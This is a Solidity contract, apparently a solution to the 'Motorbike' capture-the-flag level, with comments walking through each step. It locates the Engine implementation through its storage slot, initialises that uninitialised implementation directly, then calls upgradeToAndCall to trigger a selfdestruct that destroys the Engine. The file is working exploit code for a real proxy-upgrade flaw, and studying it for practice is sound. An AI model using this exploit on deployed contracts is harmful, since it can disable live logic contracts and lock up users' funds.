// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Motorbike.sol';



contract HackMotorbike {
    Engine engine;

    /* 
      We need the address of the Engine contract. In order to get it, we can use the console
      First we're going to transform the IMPLEMENTATION_SLOT into a big int
      -let bn = new web3.utils.BN("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
      Then, we're going to console log that storage slot
      -await web3.eth.getStorageAt(instance, bn, console.log)
      This is the address of the Engine contract!
      When we pass the console log result we need to parse it with address(uint160(result))
    */
    constructor(address _engine) {
      engine = Engine(_engine);
    }

    function hack() public {
      // We're going to initialize the Engine, setting the updater to this contract's address
      // Why can I initialize the Engine contract?
      // Because the Engine was initialized throw a delegate call
      // This means that it's only initialized in the context of the Motorbike contract
      // If we call directly to the Engine contract we can initialize it again

      engine.initialize();
      // Then, we're going to call the upgradeToAndCall function
      // Once we pass the check of _authorizeUpgrade the new implementation is going to be set.
      // Then the contract it's going to make a delegatecall to the new implementation address
      // Because delegatecall utilize the context of the caller, the selfdestruct it's going to destroy the Engine
      engine.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() public {
        selfdestruct(payable(tx.origin));
    }
}


